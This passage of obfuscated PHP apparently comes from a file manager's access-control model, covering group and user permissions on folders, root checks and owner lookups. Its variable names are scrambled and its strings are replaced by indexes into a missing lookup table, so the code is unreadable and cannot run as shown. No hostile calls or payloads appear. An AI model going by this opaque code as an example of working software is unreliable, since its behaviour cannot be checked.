array($”¥§Â‹ú); if ($İ®š©£Í[$‚‰•º›¥[488]] == $‚‰•º›¥[91]) { $µ¦Ô¾È = array($‚‰•º›¥[660] => array($‚‰•º›¥[620], $İ®š©£Í[$‚‰•º›¥[589]] . $”¥§Â‹ú . $‚‰•º›¥[621])); $úÉ¹…Ò¸ = Model($‚‰•º›¥[1444])->field($‚‰•º›¥[494])->where($µ¦Ô¾È)->getField($‚‰•º›¥[194], !0); $úÉ¹…Ò¸[] = $”¥§Â‹ú; } $this->where(array($‚‰•º›¥[494] => array($‚‰•º›¥[495], $úÉ¹…Ò¸)))->delete(); return !0; } public function getAllChildren($ı²¥©·Ì) { $şìöİ÷ =& $_SERVER[ÅÄÇĞô]; $¸–äˆüÆ = Model($şìöİ÷[1444])->sourceInfo($ı²¥©·Ì); if ($¸–äˆüÆ[$şìöİ÷[488]] != $şìöİ÷[91]) { return $this->sourceListAuth(array($ı²¥©·Ì)); } if ($¸–äˆüÆ[$şìöİ÷[191]] != SourceModel::TYPE_GROUP) { return array(); } $Õ–Õ»§º = 1; $ÏÄ‚´ÂÌ = array($ı²¥©·Ì); if ($¸–äˆüÆ[$şìöİ÷[193]] == $şìöİ÷[231] && $¸–äˆüÆ[$şìöİ÷[574]] != $Õ–Õ»§º) { $ÏÄ‚´ÂÌ = $this->groupChidldAllRootSource($¸–äˆüÆ[$şìöİ÷[574]]); } $Ó‡­™è… = $this->field($şìöİ÷[194])->group($şìöİ÷[194])->select(); $Ó‡­™è… = array_to_keyvalue($Ó‡­™è…, $şìöİ÷[12], $şìöİ÷[194]); if (!$Ó‡­™è…) { return array(); } $å¯®ïûÈ = $şìöİ÷[2189]; $÷µ„ÁÉä = array($şìöİ÷[194] => array($şìöİ÷[7], $Ó‡­™è…), $şìöİ÷[508] => $şìöİ÷[231]); $Ñ¢öìâ = Model($şìöİ÷[925])->field($å¯®ïûÈ)->where($÷µ„ÁÉä)->select(); $ÙÁ³Ûı³ = array($ı²¥©·Ì); foreach ($Ñ¢öìâ as $µ‡¸–„¡) { foreach ($ÏÄ‚´ÂÌ as $àıĞÈúç) { $´Ÿ¹Ù¬Ô = $şìöİ÷[50] . $àıĞÈúç . $şìöİ÷[50]; $‰âø •Å = $µ‡¸–„¡[$şìöİ÷[589]] . $µ‡¸–„¡[$şìöİ÷[194]] . $şìöİ÷[50]; if (strstr($‰âø •Å, $´Ÿ¹Ù¬Ô)) { $ÙÁ³Ûı³[] = $µ‡¸–„¡[$şìöİ÷[194]]; break; } } } return $this->sourceListAuth($ÙÁ³Ûı³); } private function sourceListAuth($——ìÃ¯„) { $¨¢äüí =& $_SERVER[ÅÄÇĞô]; $§“Ë¡©ø = Model($¨¢äüí[1444])->sourceListInfo($——ìÃ¯„, !0); $ó×–­ûÏ = $this->sourceAuthSelect($——ìÃ¯„); $Œ¥¶¥É™ = array(); $„ƒ›ğ®ç = array(); foreach ($§“Ë¡©ø as $Şş‘ù¨) { unset($Şş‘ù¨[$¨¢äüí[532]]); unset($Şş‘ù¨[$¨¢äüí[530]]); unset($Şş‘ù¨[$¨¢äüí[490]]); unset($Şş‘ù¨[$¨¢äüí[90]]); $ûá˜˜ì™ = $ó×–­ûÏ[$Şş‘ù¨[$¨¢äüí[194]]]; if (!$ûá˜˜ì™) { continue; } $Şş‘ù¨[$¨¢äüí[2190]] = $this->authTargetInfo($ûá˜˜ì™); $Şş‘ù¨[$¨¢äüí[587]] = rtrim($Şş‘ù¨[$¨¢äüí[593]], $¨¢äüí[8]) . $¨¢äüí[8] . ltrim($Şş‘ù¨[$¨¢äüí[587]], $¨¢äüí[8]); $Œ¥¶¥É™[] = $Şş‘ù¨; $÷ƒà¨Ìµ = count(explode($¨¢äüí[8], trim($Şş‘ù¨[$¨¢äüí[587]], $¨¢äüí[8]))); $„ƒ›ğ®ç[] = $÷ƒà¨Ìµ + ($Şş‘ù¨[$¨¢äüí[33]] == $¨¢äüí[78] ? 0 : 1000); } array_multisort($„ƒ›ğ®ç, SORT_ASC, $Œ¥¶¥É™); return $Œ¥¶¥É™; } private function groupChidldAllRootSource($ÄŸ•ôâ¯) { $úÉĞÍ ® =& $_SERVER[ÅÄÇĞô]; $Ôá¼‚Ö = Model($úÉĞÍ ®[2191])->groupChildrenAll($ÄŸ•ôâ¯); $º·‹ŞÆ˜ = array($úÉĞÍ ®[193] => 0, $úÉĞÍ ®[574] => array($úÉĞÍ ®[7], $Ôá¼‚Ö), $úÉĞÍ ®[191] => SourceModel::TYPE_GROUP); $Ñİç¸´ê = Model($úÉĞÍ ®[925])->field($úÉĞÍ ®[194])->where($º·‹ŞÆ˜)->select(); $Ñİç¸´ê = array_to_keyvalue($Ñİç¸´ê, $úÉĞÍ ®[12], $úÉĞÍ ®[194]); return $Ñİç¸´ê; } private function authTargetInfo($åç¬ş††) { $¶¨ĞèÄ =& $_SERVER[ÅÄÇĞô]; $şƒÈÖê  = array(); $‹¾¨Œ÷È = array(); $ª–«áèË = 2 << 25; foreach ($åç¬ş†† as $¼Ïø¤£) { $Éô¬€ÔÔ = Model($¶¨ĞèÄ[576])->listData($¼Ïø¤£[$¶¨ĞèÄ[2106]]); if (!$Éô¬€ÔÔ) { continue; } if ($¼Ïø¤£[$¶¨ĞèÄ[191]] == SourceModel::TYPE_USER) { $…œÑ«ªœ = Model($¶¨ĞèÄ[582])->getInfoSimpleOuter($¼Ïø¤£[$¶¨ĞèÄ[574]]); if ($…œÑ«ªœ[$¶¨ĞèÄ[1797]] == $¶¨ĞèÄ[1296]) { continue; } if ($…œÑ«ªœ[$¶¨ĞèÄ[1797]] == $¶¨ĞèÄ[231]) { $…œÑ«ªœ[$¶¨ĞèÄ[32]] = LNG($¶¨ĞèÄ[2192]); } } else { $…œÑ«ªœ = Model($¶¨ĞèÄ[590])->getInfoSimple($¼Ïø¤£[$¶¨ĞèÄ[574]]); } if (!$…œÑ«ªœ) { continue; } $…œÑ«ªœ[$¶¨ĞèÄ[545]] = $Éô¬€ÔÔ; $şƒÈÖê [] = $…œÑ«ªœ; $óõäúÈ = 0; if ($¼Ïø¤£[$¶¨ĞèÄ[191]] == SourceModel::TYPE_GROUP) { $óõäúÈ = $ª–«áèË * 2; } if ($¼Ïø¤£[$¶¨ĞèÄ[191]] == SourceModel::TYPE_USER) { $óõäúÈ = $ª–«áèË; } if ($¼Ïø¤£[$¶¨ĞèÄ[191]] == SourceModel::TYPE_USER && $¼Ïø¤£[$¶¨ĞèÄ[574]] == $¶¨ĞèÄ[231]) { $óõäúÈ = 0; } $‹¾¨Œ÷È[] = $Éô¬€ÔÔ[$¶¨ĞèÄ[490]] + $óõäúÈ; } array_multisort($‹¾¨Œ÷È, SORT_DESC, $şƒÈÖê ); return $şƒÈÖê ; } public function getAllChildrenByUser($¤Œ²ïÂ, $ß‘Ø£Ó) { $üÄé•®¸ =& $_SERVER[ÅÄÇĞô]; $š´øûŒ = Model($üÄé•®¸[602])->getInfo($ß‘Ø£Ó); if (!$ß‘Ø£Ó || !$¤Œ²ïÂ || !$š´øûŒ) { return array(); } $¶ÎßÙ„– = Model($üÄé•®¸[1444])->sourceInfo($¤Œ²ïÂ); $çšˆƒ¿ = array(); $ëìÊş‡ = 1; if ($¶ÎßÙ„–[$üÄé•®¸[193]] == $üÄé•®¸[231] && $¶ÎßÙ„–[$üÄé•®¸[574]] != $ëìÊş‡ && $this->groupContainUser($¶ÎßÙ„–[$üÄé•®¸[574]], $ß‘Ø£Ó)) { foreach ($š´øûŒ[$üÄé•®¸[2193]] as $ïìÇé×ã) { $–ò„–ï± = Model($üÄé•®¸[590])->getInfo($ïìÇé×ã[$üÄé•®¸[1998]]); $ğÛİº·Õ = Model($üÄé•®¸[602])->getInfoSimpleOuter($ß‘Ø£Ó); $ğÛİº·Õ[$üÄé•®¸[545]] = $ïìÇé×ã[$üÄé•®¸[490]]; if (Model($üÄé•®¸[576])->authCheckAction($ïìÇé×ã[$üÄé•®¸[490]][$üÄé•®¸[490]], $üÄé•®¸[2019])) { continue; } $±¡ ¼ßé = array($üÄé•®¸[32] => $üÄé•®¸[1316] . $–ò„–ï±[$üÄé•®¸[32]], $üÄé•®¸[194] => $–ò„–ï±[$üÄé•®¸[90]][$üÄé•®¸[194]], $üÄé•®¸[87] => KodIO::make($–ò„–ï±[$üÄé•®¸[90]][$üÄé•®¸[194]]), $üÄé•®¸[193] => $üÄé•®¸[231], $üÄé•®¸[191] => $üÄé•®¸[583], $üÄé•®¸[33] => $üÄé•®¸[624], $üÄé•®¸[587] => $–ò„–ï±[$üÄé•®¸[594]], $üÄé•®¸[1998] => $–ò„–ï±[$üÄé•®¸[1998]], $üÄé•®¸[591] => $–ò„–ï±[$üÄé•®¸[193]], $üÄé•®¸[2190] => array($ğÛİº·Õ)); $çšˆƒ¿[$±¡ ¼ßé[$üÄé•®¸[194]]] = $±¡ ¼ßé; } } $–Ÿ•¡›€ = array(); $¯Ôß»Ÿ¬ = $this->getAllChildren($¤Œ²ïÂ); foreach ($¯Ôß»Ÿ¬ as $ÉãÃË‘‹) { $šéÄíÔ = !1; foreach ($ÉãÃË‘‹[$üÄé•®¸[2190]] as $”‚æ¢Ùú) { if ($”‚æ¢Ùú[$üÄé•®¸[1797]]) { if ($”‚æ¢Ùú[$üÄé•®¸[1797]] == $ß‘Ø£Ó) { $šéÄíÔ = !0; break; } } if ($”‚æ¢Ùú[$üÄé•®¸[1998]]) { if ($this->groupContainUser($”‚æ¢Ùú[$üÄé•®¸[1998]], $ß‘Ø£Ó)) { $šéÄíÔ = !0; break; } } } if ($šéÄíÔ) { $–Ÿ•¡›€[] = $ÉãÃË‘‹; } $®à¸œû‚ = $ÉãÃË‘‹[$üÄé•®¸[194]]; if (isset($çšˆƒ¿[$®à¸œû‚])) { $ÉãÃË‘‹[$üÄé•®¸[2190]][] = $çšˆƒ¿[$®à¸œû‚][0]; $çšˆƒ¿[$®à¸œû‚] = !1; } } $çšˆƒ¿ = array_filter(array_values($çšˆƒ¿)); $–Ÿ•¡›€ = array_merge($çšˆƒ¿, $–Ÿ•¡›€); return $–Ÿ•¡›€; } public function setAllChildrenByUser($´¶ÁîÔ¸, $Ø…í¡ç·, $­Ñí°É) { $”Ö¢ùÊ¹ =& $_SERVER[ÅÄÇĞô]; $Ã³ìÀ–Ø = $this->getAllChildrenByUser($´¶ÁîÔ¸, $Ø…í¡ç·); if (!$­Ñí°É || !$Ã³ìÀ–Ø) { return !1; } foreach ($Ã³ìÀ–Ø as $İ‡–Õ¨Å) { $“ƒÄéùŒ = array(); foreach ($İ‡–Õ¨Å[$”Ö¢ùÊ¹[2190]] as $”¶³ëç‰) { $©„ßå× = $”¶³ëç‰[$”Ö¢ùÊ¹[545]]; $¼¿Ïì²İ = $”¶³ëç‰[$”Ö¢ùÊ¹[1797]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ôÄ¦‡¡¶ = $”¶³ëç‰[$”Ö¢ùÊ¹[1797]] ? $”¶³ëç‰[$”Ö¢ùÊ¹[1797]] : $”¶³ëç‰[$”Ö¢ùÊ¹[1998]]; if ($”¶³ëç‰[$”Ö¢ùÊ¹[1797]] && $”¶³ëç‰[$”Ö¢ùÊ¹[1797]] == $Ø…í¡ç·) { continue; } $“ƒÄéùŒ[] = array($”Ö¢ùÊ¹[194] => $İ‡–Õ¨Å[$”Ö¢ùÊ¹[194]], $”Ö¢ùÊ¹[191] => $¼¿Ïì²İ, $”Ö¢ùÊ¹[574] => intval($ôÄ¦‡¡¶), $”Ö¢ùÊ¹[2106] => isset($©„ßå×[$”Ö¢ùÊ¹[478]]) ? intval($©„ßå×[$”Ö¢ùÊ¹[478]]) : 0, $”Ö¢ùÊ¹[2170] => isset($©„ßå×[$”Ö¢ùÊ¹[2170]]) ? intval($©„ßå×[$”Ö¢ùÊ¹[2170]]) : -1); } $“ƒÄéùŒ[] = array($”Ö¢ùÊ¹[194] => $İ‡–Õ¨Å[$”Ö¢ùÊ¹[194]], $”Ö¢ùÊ¹[191] => SourceModel::TYPE_USER, $”Ö¢ùÊ¹[574] => intval($Ø…í¡ç·), $”Ö¢ùÊ¹[2106] => intval($­Ñí°É), $”Ö¢ùÊ¹[2170] => -1); $this->where(array($”Ö¢ùÊ¹[494] => $İ‡–Õ¨Å[$”Ö¢ùÊ¹[194]]))->delete(); $this->addAll($“ƒÄéùŒ); } return !0; } public function get($Ğ½¼­´û) { $ÈÑİ‰Ö¬ = $this->getSourceList(array($Ğ½¼­´û), !0); return $ÈÑİ‰Ö¬[0]; } public function getSourceList($Ùª§™, $‹æËÕİó = false, $ú×ñ«”î = false) { $ÔïĞìİ÷ =& $_SERVER[ÅÄÇĞô]; if (!$Ùª§™) { return array(); } $¬ú˜ºÕš = Model($ÔïĞìİ÷[1444]); if (!$‹æËÕİó && count($Ùª§™) == 1) { $‹æËÕİó = array(); $‹æËÕİó[$Ùª§™[0]] = $¬ú˜ºÕš->sourceInfo($Ùª§™[0]); } if (!$‹æËÕİó) { $­êÂ¬ï¦ = array($ÔïĞìİ÷[494] => array($ÔïĞìİ÷[495], $Ùª§™)); $‹æËÕİó = $¬ú˜ºÕš->field($ÔïĞìİ÷[2194])->where($­êÂ¬ï¦)->select(); $‹æËÕİó = array_to_keyvalue($‹æËÕİó, $ÔïĞìİ÷[194]); } $‡ïıáœŸ = $Ùª§™; foreach ($‹æËÕİó as $®À§‚ê¯ => $Äœ›ßŸ¸) { $÷‘ã›ù = $¬ú˜ºÕš->parentLevelArray($Äœ›ßŸ¸[$ÔïĞìİ÷[589]]); $‡ïıáœŸ = array_merge($‡ïıáœŸ, array($®À§‚ê¯), array_reverse($÷‘ã›ù)); } $‡ïıáœŸ = array_values(array_unique($‡ïıáœŸ)); if (!$‡ïıáœŸ) { return array(); } $ÖÔ¶Ä˜˜ = $this->sourceAuthSelect($‡ïıáœŸ); $›ø¾²›æ = array(); foreach ($‡ïıáœŸ as $™´Û¦Á) { if (isset($ÖÔ¶Ä˜˜[$™´Û¦Á])) { $›ø¾²›æ[$™´Û¦Á] = $ÖÔ¶Ä˜˜[$™´Û¦Á]; } } $‹§ ğ€Ù = $this->userIsRoot($ú×ñ«”î); $÷‚İùáú = AuthModel::authAll(); $Î´†ØÅ = array($ÔïĞìİ÷[491] => $÷‚İùáú, $ÔïĞìİ÷[2195] => array($ÔïĞìİ÷[496] => 0, $ÔïĞìİ÷[2004] => $÷‚İùáú, $ÔïĞìİ÷[497] => LNG($ÔïĞìİ÷[2196]), $ÔïĞìİ÷[2021] => $ÔïĞìİ÷[2197])); $ûÀ†öÍ¬ = array(); foreach ($‹æËÕİó as $™´Û¦Á => $Á…·Ó) { if ($‹§ ğ€Ù && $GLOBALS[$ÔïĞìİ÷[6]][$ÔïĞìİ÷[2017]]) { $ûÀ†öÍ¬[$™´Û¦Á] = $Î´†ØÅ; continue; } $ûÀ†öÍ¬[$™´Û¦Á] = $this->makeSourceAuth($Á…·Ó, $›ø¾²›æ, $ú×ñ«”î); } return $ûÀ†öÍ¬; } public function authDeepCheck($Ù»­õñ, $Ú¨ÇÎº = false) { $èö’“°‰ =& $_SERVER[ÅÄÇĞô]; $Ú¨ÇÎº = $Ú¨ÇÎº ? $Ú¨ÇÎº : USER_ID; $™ä•”¥Ø = $this->makeAuthDeep($Ú¨ÇÎº); if (!in_array($Ù»­õñ, $™ä•”¥Ø[$èö’“°‰[2198]])) { return !1; } $”‚Õ–¶ = array(); foreach ($™ä•”¥Ø[$èö’“°‰[2199]] as $´™¡Äü => $Óœñ»“) { if (!in_array($Ù»­õñ, $Óœñ»“)) { continue; } $”‚Õ–¶[] = $´™¡Äü; } if (!$”‚Õ–¶) { return !1; } $ò­¬›ı‚ = $”‚Õ–¶ ? $”‚Õ–¶[0] : $Ù»­õñ; return array($èö’“°‰[491] => -1, $èö’“°‰[545] => array($èö’“°‰[496] => $èö’“°‰[1296], $èö’“°‰[2004] => $èö’“°‰[231], $èö’“°‰[497] => LNG($èö’“°‰[2200]), $èö’“°‰[2021] => $èö’“°‰[2201]), $èö’“°‰[2202] => LNG($èö’“°‰[2203]), $èö’“°‰[2204] => $this->sourceAuthInfo($ò­¬›ı‚)); } protected function makeAuthDeep($Ö­Â²“ = false) { $ÅàŠçÈ =& $_SERVER[ÅÄÇĞô]; static $Œİñ½ãá = array(); $Ö­Â²“ = $Ö­Â²“ ? $Ö­Â²“ : USER_ID; if (isset($Œİñ½ãá[$Ö­Â²“])) { return $Œİñ½ãá[$Ö­Â²“]; } $ š´ÔŠë = Model($ÅàŠçÈ[2205])->listData(); $…ÂÙÀô­ = array(); foreach ($ š´ÔŠë as $İîº×èÌ) { if ($İîº×èÌ[$ÅàŠçÈ[490]] == 0 && $İîº×èÌ[$ÅàŠçÈ[2020]] == $ÅàŠçÈ[91]) { $…ÂÙÀô­[] = $İîº×èÌ[$ÅàŠçÈ[478]]; } } $ğö«é½Ë = $this->userGroupParents($Ö­Â²“); $Ë¿–´’÷ = array($ÅàŠçÈ[191] => SourceModel::TYPE_USER, $ÅàŠçÈ[574] => $Ö­Â²“); if ($ğö«é½Ë) { $Ë¿–´’÷ = array(array($ÅàŠçÈ[191] => SourceModel::TYPE_USER, $ÅàŠçÈ[574] => $Ö­Â²“), array($ÅàŠçÈ[191] => SourceModel::TYPE_GROUP, $ÅàŠçÈ[574] => array($ÅàŠçÈ[495], $ğö«é½Ë)), $ÅàŠçÈ[1100] => $ÅàŠçÈ[2100]); } $ãûı»° = $this->field($ÅàŠçÈ[2206])->where($Ë¿–´’÷)->select(); $ŒÑ¢—÷Ê = array(); $ÛÌ‰º¡× = array_to_keyvalue_group($ãûı»°, $ÅàŠçÈ[194]); foreach ($ÛÌ‰º¡× as $Îïª•ÖÕ => $Ò“ÄÙšŒ) { $à«’óş = $this->authArrayCheck($Ò“ÄÙšŒ, $Ö­Â²“); if ($à«’óş[$ÅàŠçÈ[491]] > 0) { $ŒÑ¢—÷Ê[] = $Îïª•ÖÕ . $ÅàŠçÈ[12]; } } if ($ğö«é½Ë) { $™€ê‰¬ = Model($ÅàŠçÈ[590]); foreach ($ğö«é½Ë as $¶®Ã°µ¢) { $â½±èÌ„ = $™€ê‰¬->getInfo($¶®Ã°µ¢); if (!$â½±èÌ„ || !is_array($â½±èÌ„[$ÅàŠçÈ[90]])) { continue; } $ŒÑ¢—÷Ê[] = $â½±èÌ„[$ÅàŠçÈ[90]][$ÅàŠçÈ[194]]; } } $óëºÍªŞ = array(); $À ãÄ©æ = $ğö«é½Ë; $ß ÉÓÅì = Model($ÅàŠçÈ[1444]); $™€ê‰¬ = Model($ÅàŠçÈ[590]); $íì…Êò = array(); $Ì‡­Ê…ü = array(); $Ô÷¹“‘ = array(); $Æú–ÔÇØ = array(); if ($ŒÑ¢—÷Ê) { $Ãò®Ìğ‡ = $ß ÉÓÅì->where(array($ÅàŠçÈ[194] => array($ÅàŠçÈ[495], $ŒÑ¢—÷Ê)))->select(); foreach ($Ãò®Ìğ‡ as $ÇÚÕï“†) { if ($ÇÚÕï“†[$ÅàŠçÈ[508]] == $ÅàŠçÈ[91]) { continue; } $ĞĞÍ·óá = $ß ÉÓÅì->parentLevelArray($ÇÚÕï“†[$ÅàŠçÈ[589]]); $óëºÍªŞ = array_merge($óëºÍªŞ, $ĞĞÍ·óá); $À ãÄ©æ[] = $ÇÚÕï“†[$ÅàŠçÈ[574]]; $íì…Êò[$ÇÚÕï“†[$ÅàŠçÈ[194]]] = $ĞĞÍ·óá; $Ì‡­Ê…ü[$ÇÚÕï“†[$ÅàŠçÈ[194]]] = $ÇÚÕï“†[$ÅàŠçÈ[574]]; } } $À ãÄ©æ = array_values(array_unique($À ãÄ©æ)); $û×«¸ˆÏ = $À ãÄ©æ; foreach ($û×«¸ˆÏ as $¶®Ã°µ¢) { $â½±èÌ„ = $™€ê‰¬->getInfo($¶®Ã°µ¢); $ĞĞÍ·óá = $ß ÉÓÅì->parentLevelArray($â½±èÌ„[$ÅàŠçÈ[589]]); $À ãÄ©æ = array_merge($À ãÄ©æ, $ĞĞÍ·óá); } $À ãÄ©æ = array_values(array_unique($À ãÄ©æ)); foreach ($À ãÄ©æ as $¶®Ã°µ¢) { $â½±èÌ„ = $™€ê‰¬->getInfo($¶®Ã°µ¢); $óëºÍªŞ[] = $â½±èÌ„[$ÅàŠçÈ[90]][$ÅàŠçÈ[194]]; $Ô÷¹“‘[$¶®Ã°µ¢] = $â½±èÌ„[$ÅàŠçÈ[90]][$ÅàŠçÈ[194]]; $Æú–ÔÇØ[$¶®Ã°µ¢] = $ß ÉÓÅì->parentLevelArray($â½±èÌ„[$ÅàŠçÈ[589]]); } foreach ($íì…Êò as $œ¯Ï¬© => $ƒÅ•÷ç‡) { $ä—µªÊÁ = $Ì‡­Ê…ü[$œ¯Ï¬©]; if (!$ä—µªÊÁ || !$Ô÷¹“‘[$ä—µªÊÁ]) { continue; } $Áú×‡ = array(); foreach ($Æú–ÔÇØ[$ä—µªÊÁ] as $¶®Ã°µ¢) { $Áú×‡[] = $Ô÷¹“‘[$¶®Ã°µ¢]; } $íì…Êò[$œ¯Ï¬©] = array_merge($Áú×‡, $ƒÅ•÷ç‡); } $óëºÍªŞ = array_values(array_unique($óëºÍªŞ)); $Ş‰›ü±â = array($ÅàŠçÈ[2198] => $óëºÍªŞ, $ÅàŠçÈ[2199] => $íì…Êò); $Œİñ½ãá[$Ö­Â²“] = $Ş‰›ü±â; return $Ş‰›ü±â; } private function makeSourceAuth($Ê˜ŒƒŠ, $ı®ÃÅö¨, $¯ƒŸÓÉè = false) { $Ï‡Ìíƒ± =& $_SERVER[ÅÄÇĞô]; $ÚÏâ¾°Ë = $Ï‡Ìíƒ±[91]; $í“ÒƒÄ” = $Ê˜ŒƒŠ[$Ï‡Ìíƒ±[574]]; $¼÷Šû· = $Ê˜ŒƒŠ[$Ï‡Ìíƒ±[191]] == SourceModel::TYPE_GROUP; $£¯’Š†å = $¼÷Šû· ? $this->groupRootAuth($í“ÒƒÄ”, $¯ƒŸÓÉè) : !1; if ($£¯’Š†å && Model($Ï‡Ìíƒ±[576])->authCheckAction($£¯’Š†å[$Ï‡Ìíƒ±[490]], $Ï‡Ìíƒ±[2019])) { return $this->groupAuthInfo($£¯’Š†å, $í“ÒƒÄ”); } $û«î™Ù = Model($Ï‡Ìíƒ±[1444])->parentLevelArray($Ê˜ŒƒŠ[$Ï‡Ìíƒ±[589]]); $û«î™Ù = array_merge(array($Ê˜ŒƒŠ[$Ï‡Ìíƒ±[194]]), array_reverse($û«î™Ù)); $èıú­”È = !1; foreach ($û«î™Ù as $âÖ“Å­) { if (!isset($ı®ÃÅö¨[$âÖ“Å­])) { continue; } $ß«ğÍäÏ = $this->authMake($ı®ÃÅö¨[$âÖ“Å­], $¯ƒŸÓÉè); if ($ß«ğÍäÏ[$Ï‡Ìíƒ±[545]]) { $èıú­”È = $ß«ğÍäÏ; break; } } if (!$¼÷Šû·) { return $èıú­”È; } if (!$èıú­”È && $£¯’Š†å) { $èıú­”È = $this->groupAuthInfo($£¯’Š†å, $í“ÒƒÄ”); } if (!$èıú­”È) { $“šª¥ = Model($Ï‡Ìíƒ±[590])->getInfo($í“ÒƒÄ”); $ö‚¡¼êÑ = explode($Ï‡Ìíƒ±[50], trim($“šª¥[$Ï‡Ìíƒ±[589]], $Ï‡Ìíƒ±[50])); $ö‚¡¼êÑ = array_reverse($ö‚¡¼êÑ); foreach ($ö‚¡¼êÑ as $…ØèÔ‚×) { if ($…ØèÔ‚× == $Ï‡Ìíƒ±[231] || $…ØèÔ‚× == $ÚÏâ¾°Ë) { continue; } $±½Ñ¢Íà = $this->groupRootAuth($…ØèÔ‚×, $¯ƒŸÓÉè); if (!$±½Ñ¢Íà) { continue; } $èıú­”È = $this->groupAuthInfo($±½Ñ¢Íà, $…ØèÔ‚×); break; } } if (!$èıú­”È || $èıú­”È[$Ï‡Ìíƒ±[491]] <= 0) { $ÌÊ²¡Üª = $this->authDeepCheck($Ê˜ŒƒŠ[$Ï‡Ìíƒ±[194]], $¯ƒŸÓÉè); if ($ÌÊ²¡Üª) { $èıú­”È = $ÌÊ²¡Üª; } } return $èıú­”È; } private function userIsRoot($ŸÀ”ã´ = false) { $±€„ší¸ =& $_SERVER[ÅÄÇĞô]; if (!$ŸÀ”ã´ && KodUser::isRoot()) { return !0; } $Æ€°…ˆ = Model($±€„ší¸[602])->getInfo($ŸÀ”ã´); $¼Û¦´§° = Model($±€„ší¸[2207])->listData($Æ€°…ˆ[$±€„ší¸[2208]]); if ($¼Û¦´§° && $¼Û¦´§°[$±€„ší¸[580]][$±€„ší¸[2209]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ˆ¢Æµª²) { $ÎñÉê¶ =& $_SERVER[ÅÄÇĞô]; $ùÄâñ’ = Model($ÎñÉê¶[1444]); $ùöƒÖ¶À = $ùÄâñ’->sourceInfo($ˆ¢Æµª²); if (!$ùöƒÖ¶À) { return !1; } $ùÄâñ’->groupPathDisplay($ùöƒÖ¶À); $ı¥Æ¯É‡ = array($ùöƒÖ¶À); $ı¥Æ¯É‡ = $ùÄâñ’->_listAppendPath($ı¥Æ¯É‡); $ùöƒÖ¶À = $ı¥Æ¯É‡[0]; $¤à¥´– = $ùöƒÖ¶À[$ÎñÉê¶[587]]; if (isset($ùöƒÖ¶À[$ÎñÉê¶[595]])) { $ö¬ç÷¶† = explode($ÎñÉê¶[8], trim($ùöƒÖ¶À[$ÎñÉê¶[587]], $ÎñÉê¶[8])); array_shift($ö¬ç÷¶†); $¤à¥´– = $ùöƒÖ¶À[$ÎñÉê¶[593]] . $ÎñÉê¶[2210] . implode($ÎñÉê¶[8], $ö¬ç÷¶†); } return array($ÎñÉê¶[497] => $ùöƒÖ¶À[$ÎñÉê¶[32]], $ÎñÉê¶[87] => KodIO::make($ùöƒÖ¶À[$ÎñÉê¶[194]]), $ÎñÉê¶[2211] => $¤à¥´–); } private function groupAuthInfo($ğáŠĞø«, $åÈá’Ä) { $±¥ßÂ«µ =& $_SERVER[ÅÄÇĞô]; $À¨à…Ì = Model($±¥ßÂ«µ[590])->getInfo($åÈá’Ä); return array($±¥ßÂ«µ[2212] => intval($ğáŠĞø«[$±¥ßÂ«µ[490]]), $±¥ßÂ«µ[2195] => $ğáŠĞø«, $±¥ßÂ«µ[2213] => LNG($±¥ßÂ«µ[2214]), $±¥ßÂ«µ[2204] => array($±¥ßÂ«µ[497] => $À¨à…Ì[$±¥ßÂ«µ[32]], $±¥ßÂ«µ[87] => KodIO::make($À¨à…Ì[$±¥ßÂ«µ[90]][$±¥ßÂ«µ[194]]), $±¥ßÂ«µ[2211] => $À¨à…Ì[$±¥ßÂ«µ[594]])); } protected function groupRootAuth($âÎ¼’Œõ, $·Íõ¦ÕÉ = false) { $†×Üş®ª =& $_SERVER[ÅÄÇĞô]; $·Íõ¦ÕÉ = $·Íõ¦ÕÉ ? $·Íõ¦ÕÉ : USER_ID; $€²ü©¦ = $·Íõ¦ÕÉ . $†×Üş®ª[2215] . $âÎ¼’Œõ; static $ÃÇËü…© = array(); if (isset($ÃÇËü…©[$€²ü©¦])) { return $ÃÇËü…©[$€²ü©¦]; } $ÛæŠÊıµ = Model($†×Üş®ª[590])->getInfo($âÎ¼’Œõ); $ÏÊ’áÌ  = $this->userGroupList($·Íõ¦ÕÉ); $Ö—ŠÏµˆ = isset($ÏÊ’áÌ [$âÎ¼’Œõ]) ? $ÏÊ’áÌ [$âÎ¼’Œõ][$†×Üş®ª[490]] : !1; if ($Ö—ŠÏµˆ && Model($†×Üş®ª[576])->authCheckAction($Ö—ŠÏµˆ[$†×Üş®ª[490]], $†×Üş®ª[2019])) { $ÃÇËü…©[$€²ü©¦] = $Ö—ŠÏµˆ; return $Ö—ŠÏµˆ; } $„í²úò = $this->sourceAuthSelect($ÛæŠÊıµ[$†×Üş®ª[90]][$†×Üş®ª[194]]); $º‘çïÇ¬ = $„í²úò ? $this->authMake($„í²úò, $·Íõ¦ÕÉ) : !1; $´›íğóˆ = $º‘çïÇ¬ ? $º‘çïÇ¬[$†×Üş®ª[545]] : !1; $ÃÇËü…©[$€²ü©¦] = $´›íğóˆ ? $´›íğóˆ : $Ö—ŠÏµˆ; return $ÃÇËü…©[$€²ü©¦]; } public function authOwnerApply($Ğ¸ÈÍš³) { $¸²ÒÈ“› =& $_SERVER[ÅÄÇĞô]; if (empty($Ğ¸ÈÍš³[$¸²ÒÈ“›[490]]) || isset($Ğ¸ÈÍš³[$¸²ÒÈ“›[2216]]) && $Ğ¸ÈÍš³[$¸²ÒÈ“›[2216]]) { return $Ğ¸ÈÍš³; } if (AuthModel::authCheckRoot($Ğ¸ÈÍš³[$¸²ÒÈ“›[490]][$¸²ÒÈ“›[491]])) { return $Ğ¸ÈÍš³; } $ŸóºÄ„Ğ = Model($¸²ÒÈ“›[1444])->parentLevelArray($Ğ¸ÈÍš³[$¸²ÒÈ“›[589]]); $ŸóºÄ„Ğ = array_merge(array($Ğ¸ÈÍš³[$¸²ÒÈ“›[194]]), array_reverse($ŸóºÄ„Ğ)); $Û®£è¡  = $this->sourceAuthSelect($ŸóºÄ„Ğ); $’ûğ÷êá = array(); $¡¼÷şó = array(); foreach ($Û®£è¡  as $°„æø× => $ÔïÓÆÃÏ) { $î§£…‡ = $this->authFolderOwnerUser($ÔïÓÆÃÏ); $’ûğ÷êá[$°„æø×] = $î§£…‡; $¡¼÷şó = array_merge($¡¼÷şó, $î§£…‡[$¸²ÒÈ“›[670]]); if ($î§£…‡[$¸²ÒÈ“›[2217]]) { break; } } if (count($¡¼÷şó) == 0) { $¡¼÷şó = $this->authFolderOwnerGroup($Ğ¸ÈÍš³[$¸²ÒÈ“›[574]]); } 